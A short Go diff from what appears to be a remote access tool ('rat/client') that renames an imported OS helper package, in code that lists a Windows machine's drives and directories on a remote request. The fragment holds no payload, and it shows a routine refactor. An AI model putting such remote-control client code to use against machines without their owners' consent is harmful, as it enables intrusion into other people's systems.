@@ -4,7 +4,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
-	"oslib"
+	"osutil"
 	"rat/client/drives"
 	"rat/shared/network/header"
 
@@ -31,7 +31,7 @@ func (packet *DirectoryPacket) Init() {
 	var files []os.FileInfo
 	var err error
 
-	if packet.Path == "" && oslib.Name == oslib.Windows {
+	if packet.Path == "" && osutil.Name == osutil.Windows {
 		drives.QueryDrives()
 		files = drives.Drives
 	} else {
